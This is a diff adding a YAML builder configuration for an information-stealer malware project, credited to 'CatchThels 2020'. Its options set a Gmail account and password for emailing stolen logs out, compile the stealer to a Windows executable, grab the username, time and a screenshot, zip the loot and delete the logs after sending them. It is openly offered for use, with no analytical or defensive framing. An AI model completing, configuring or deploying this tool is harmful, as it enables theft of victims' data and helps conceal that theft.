@@ -1,0 +1,22 @@
+# BUILDER CONFIG:
+
+# Syntax: STR, BOOL
+
+pyconf:
+    pipExec: pip # Insert here your pip execute command(EX. pip install pyyaml || pip3 install pyyaml)
+    
+builder:
+    stealerlogging: False # [BOOL] Should stealer print logging?
+    mail:  # [STR] Your e-mail for send logs ---(ONLY GMAIL SUPPORT!!!)---
+    mailpassword:  # [STR] Your e-mail password
+    execompile: True # [BOOL] Should stealer compile application to .exe ?
+    getotherlog: True # [BOOL] Should stealer get other info(USERNAME, TIME, SCREENSHOT)
+    logfilename: log.zip # [STR] Insert .zip file name
+    removelog: True # [BOOL] Should stealer remove all logs after sending it?
+
+# TIP: If you want to use custom directories, edit main.py file, just look at syntax in source code
+
+# If you input incorrect login/password. Your logs cannot be sended. So please check your credentials.
+
+
+# Developed by CatchThels 2020.
